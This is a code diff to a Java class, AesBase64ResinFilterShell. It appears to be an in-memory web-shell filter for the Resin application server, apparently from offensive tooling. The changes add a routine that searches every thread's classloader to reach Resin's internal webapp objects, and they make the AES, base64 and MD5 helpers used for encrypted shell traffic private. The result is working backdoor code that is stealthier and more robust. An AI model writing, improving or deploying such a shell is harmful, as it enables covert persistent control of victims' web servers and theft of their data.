@@ -37,10 +37,9 @@ public class AesBase64ResinFilterShell extends ClassLoader implements Filter {
 
 
 
-    public static Object[] getServers() throws Throwable {
+    private static Object[] getServers() throws Throwable {
         HashSet webapps = new HashSet();
-        ClassLoader loader = Thread.currentThread().getContextClassLoader();
-        Class servletInvocationClass = loader.loadClass("com.caucho.server.dispatch.ServletInvocation");
+        Class servletInvocationClass = loadClassEx("com.caucho.server.dispatch.ServletInvocation");
         Object contextRequest = servletInvocationClass.getMethod("getContextRequest").invoke(null);
         Object webApp = contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);
         webapps.add(webApp);
@@ -166,7 +165,41 @@ public class AesBase64ResinFilterShell extends ClassLoader implements Filter {
 
         return field;
     }
-    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
+
+    private static Class loadClassEx(String className) throws ClassNotFoundException{
+        try {
+            return Class.forName(className);
+        } catch (Throwable e) {
+            try {
+                return Class.forName(className, true, Thread.currentThread().getContextClassLoader());
+            } catch (Throwable ignored) {
+                try {
+                    Thread[] threads = new Thread[Thread.activeCount()];
+                    Thread.enumerate(threads);
+                    for (int i = 0; i < threads.length; i++) {
+                        Thread thread = threads[i];
+                        if (thread == null) {
+                            continue;
+                        }
+                        try {
+                            ClassLoader loader = thread.getContextClassLoader();
+                            return loader.loadClass(className);
+                        } catch (Throwable ignored2) {
+
+                        }
+
+                    }
+
+                } catch (Throwable ignored2) {
+
+                }
+            }
+
+        }
+        throw new ClassNotFoundException(className);
+    }
+
+    private static Object getFieldValue(Object obj, String fieldName) throws Exception {
         Field f=null;
         if (obj instanceof Field){
             f=(Field)obj;
@@ -180,7 +213,7 @@ public class AesBase64ResinFilterShell extends ClassLoader implements Filter {
     }
 
 
-    public byte[] aes(byte[] s,boolean m){
+    private byte[] aes(byte[] s,boolean m){
         try{
             javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");
             c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(key.getBytes(),"AES"));
@@ -190,9 +223,9 @@ public class AesBase64ResinFilterShell extends ClassLoader implements Filter {
         }
     }
 
-    public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; }
+    private static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; }
 
-    public static String base64Encode(byte[] bs) throws Exception {
+    private static String base64Encode(byte[] bs) throws Exception {
         Class base64;
         String value = null;
         try {
@@ -216,7 +249,7 @@ public class AesBase64ResinFilterShell extends ClassLoader implements Filter {
         }
         return value;
     }
-    public static byte[] base64Decode(String bs) throws Exception {
+    private static byte[] base64Decode(String bs) throws Exception {
         Class base64;
         byte[] value = null;
         try {
